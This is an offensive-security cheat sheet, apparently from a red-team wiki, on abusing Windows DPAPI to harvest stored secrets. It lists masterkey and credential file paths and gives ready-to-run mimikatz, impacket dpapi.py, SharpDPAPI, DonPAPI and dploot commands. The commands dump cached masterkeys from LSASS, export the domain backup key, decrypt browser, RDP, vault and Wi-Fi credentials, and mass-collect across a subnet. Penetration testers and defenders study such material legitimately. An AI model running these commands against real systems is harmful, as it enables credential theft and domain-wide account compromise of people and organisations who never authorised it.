---
title: "DPAPI"
---

# 🔐 DPAPI

> _Data Protection API: Windows service used by apps (browsers, RDP, Outlook, Wi-Fi, Credential Manager, Vault...) to encrypt secrets on disk. Each user has their own **masterkeys**; those keys unlock everything else._

## 📚 Resources

- [TheHackerRecipes - DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi)
- [HarmJ0y - Operational Guidance for Offensive User DPAPI Abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-67b25cb5e8ea)

### 🛠️ Tools

- [DonPAPI](https://github.com/login-securite/DonPAPI) - automated remote collection, no LSASS touch
- [dploot](https://github.com/zblurx/dploot) - Python toolkit, scriptable
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) - C# on-host collection
- [impacket - dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
- [mimikatz](https://github.com/gentilkiwi/mimikatz) - `dpapi::` and `sekurlsa::dpapi` modules

## 📌 Key Concepts

| Term                       | Description                                                                                                 |
| -------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Masterkey**              | Random key stored per user, used to encrypt every DPAPI blob. Itself encrypted with the user's password+SID |
| **Blob**                   | Encrypted output of `CryptProtectData`. Contains a GUID pointing to the masterkey needed to decrypt it      |
| **Credential file**        | DPAPI blob stored under `Credentials\`, holds `cmdkey`-saved creds, RDP creds, Outlook, scheduled tasks     |
| **Vault**                  | Newer container (IE/Edge creds, Wi-Fi). Also DPAPI-protected                                                |
| **Domain backup key**      | RSA key on the DC. Can decrypt **any** domain user's masterkey without their password. Red team gold        |
| **DPAPI_SYSTEM LSA secret**| Machine's own DPAPI key (SYSTEM user). Needed to decrypt SYSTEM-level blobs (Wi-Fi, scheduled tasks)        |

## 📂 Key file locations

::: details

```powershell
# User masterkeys (one file = one GUID)
%APPDATA%\Microsoft\Protect\$SID\$GUID
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\$GUID

# SYSTEM masterkeys
C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\$GUID

# Credential blobs
%APPDATA%\Microsoft\Credentials\
%LOCALAPPDATA%\Microsoft\Credentials\

# Vaults
%LOCALAPPDATA%\Microsoft\Vault\
C:\ProgramData\Microsoft\Vault\

# Browser secrets (Chrome/Edge: Local State + Login Data + Cookies)
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
```

:::

### List saved credentials from a live session

```powershell
cmdkey /list # names only, no secrets
```

## 🔁 Workflow

1. **Collect** the target blob (credential file, Chrome `Login Data`, vault, ...) + the matching masterkey file
2. **Decrypt the masterkey** using one of:
   - the user's cleartext password + their SID
   - the user's NT hash (works since Win10 1607)
   - a cached masterkey from LSASS (needs admin + user logged in)
   - the **domain backup key** from the DC (works offline, for any user, any time)
3. **Decrypt the blob** with the plaintext masterkey

## 📥 Collecting the files

:::tabs

=== Local (on-host)

::: code-group

```powershell [powershell]
# Pull your own masterkeys + credentials to a staging folder
$dst = "$env:TEMP\dpapi"
mkdir $dst
Copy-Item -Recurse "$env:APPDATA\Microsoft\Protect\*"      "$dst\Protect\"
Copy-Item -Recurse "$env:APPDATA\Microsoft\Credentials\*"  "$dst\Credentials\"   -ErrorAction SilentlyContinue
Copy-Item -Recurse "$env:LOCALAPPDATA\Microsoft\Credentials\*" "$dst\CredentialsLocal\" -ErrorAction SilentlyContinue
```

```powershell [SharpDPAPI]
# All user triage, in-memory, no file drop
SharpDPAPI.exe triage                         # creds + vaults + rdg of current user
SharpDPAPI.exe triage /server:$DC             # also pull domain backup key via RPC (requires DA)
SharpDPAPI.exe machinetriage                  # SYSTEM creds (Wi-Fi, scheduled tasks)
```

=== Remote (SMB)

```bash
# Browse the Protect/Credentials shares via admin SMB access
smbclient.py $DOMAIN/$USER:$PASSWORD@$TARGET
# use C$
# cd Users\$VICTIM\AppData\Roaming\Microsoft\Protect\<SID>
# get <GUID>
```

```bash
# Or let dploot / donpapi grab everything in one shot - see Automation below
```

:::

## 🔑 Decrypt the masterkey

:::tabs

=== Unix

```bash
# With cleartext password
dpapi.py masterkey -file $MASTERKEY_FILE -sid $SID -password $PASSWORD

# With NT hash (Win10 1607+)
dpapi.py masterkey -file $MASTERKEY_FILE -sid $SID -hashes :$NT_HASH

# With the domain backup key (pvk) - works for ANY user in the domain
dpapi.py masterkey -file $MASTERKEY_FILE -key $BACKUP_KEY_PVK
```

=== Windows

::: code-group

```powershell [mimikatz - offline]
# With password
dpapi::masterkey /in:"$MASTERKEY_FILE" /sid:$SID /password:$PASSWORD

# With domain backup key (preferred for red team: offline, no victim auth)
dpapi::masterkey /in:"$MASTERKEY_FILE" /pvk:backupkey.pvk
```

```powershell [mimikatz - live]
# Pull cached masterkeys from LSASS (admin required, user must have logged in)
privilege::debug
sekurlsa::dpapi                               # dumps GUID -> plaintext masterkey mapping
```

```powershell [SharpDPAPI]
SharpDPAPI.exe masterkeys /pvk:backupkey.pvk
```

:::

## 🔓 Decrypt the blob

:::tabs

=== Unix

```bash
# Generic credential file
dpapi.py credential -file $CRED_FILE -key $MASTERKEY

# Vault (IE/Edge/Wi-Fi credentials container)
dpapi.py vault -vcrd $VAULT_FILE -vpol $POLICY_FILE -key $MASTERKEY
```

=== Windows

::: code-group

```powershell [mimikatz]
# cmdkey / Credential Manager entries
dpapi::cred /in:"$CRED_FILE" /masterkey:$MASTERKEY

# Chrome Login Data / Cookies (needs user masterkey + AES key from Local State)
dpapi::chrome /in:"$CHROME_LOGIN_DATA" /unprotect

# Vault
dpapi::vault /in:"$VAULT_FILE" /masterkey:$MASTERKEY
```

```powershell [SharpDPAPI]
# Decrypts everything triage found, given the masterkeys
SharpDPAPI.exe triage /mkfile:masterkeys.txt
SharpDPAPI.exe rdg /mkfile:masterkeys.txt     # .rdg saved RDP sessions
SharpChrome.exe logins /mkfile:masterkeys.txt
```

:::

## 🤖 Automation

> _Preferred over mimikatz for live engagements: no LSASS access, no binary drop on target, pure SMB/RPC._

:::tabs

=== DonPAPI

```bash
# Full sweep against one host (creds + vaults + browsers + Wi-Fi + RDP)
donpapi collect -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN

# With NT hash
donpapi collect -t $TARGET -u $USER -H $NT_HASH -d $DOMAIN

# Mass collection across a subnet
donpapi collect -t $SUBNET/$NETMASK -u $USER -p $PASSWORD -d $DOMAIN --threads 10

# Reuse an already-pulled domain backup key (offline decrypt of future masterkeys)
donpapi collect -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN --pvk backupkey.pvk
```

=== dploot

```bash
# Pull & decrypt masterkeys (reusable for later blobs)
dploot masterkeys -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET

# Credential Manager entries
dploot credentials -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET \
    -mkfile masterkeys.txt

# Chrome/Edge logins + cookies
dploot browser -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET \
    -mkfile masterkeys.txt

# Vaults, .rdg files, Wi-Fi
dploot vaults   -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET -mkfile masterkeys.txt
dploot rdg      -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET -mkfile masterkeys.txt
dploot wifi     -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET
```

:::

## 🏆 Domain backup key (the master shortcut)

> _A DC holds an RSA key that encrypts a copy of every user's masterkey. Pulling it once lets you decrypt any user's DPAPI data forever (until the key is rotated - rare)._

:::tabs

=== Unix

```bash
# Via LSAD RPC (Domain Admin required)
dpapi.py backupkeys -t $DC_IP $DOMAIN/$USER:$PASSWORD -o backupkey   # produces backupkey.pvk
```

```bash
# Same op with dploot
dploot backupkey -u $USER -p $PASSWORD -d $DOMAIN -t $DC_IP
```

=== Windows

```powershell
# mimikatz - export the domain backup key (requires DA)
lsadump::backupkeys /system:$DC /export        # writes .pvk + .pfx in current dir
```

```powershell
# SharpDPAPI
SharpDPAPI.exe backupkey /server:$DC           # base64 pvk to stdout, OPSEC-friendly
```

:::

Then decrypt any user's masterkey offline:

```bash
dpapi.py masterkey -file $ANY_USER_MASTERKEY -key backupkey.pvk
```

## 🧪 Quick wins to look for

- **`cmdkey /list`** on a jumpbox - saved creds for file servers, DBs, service accounts
- **Chrome/Edge `Login Data`** - cached corporate SSO or app passwords
- **`.rdg` files** in `%USERPROFILE%\Documents\` - Remote Desktop Connection Manager saves full creds DPAPI-encrypted
- **Wi-Fi profiles** - machine DPAPI, often has WPA2-Enterprise domain creds
- **Scheduled tasks** running as a user with `/RU $USER /RP $PASSWORD` - stored in `C:\Windows\System32\Tasks\` as DPAPI-protected XML
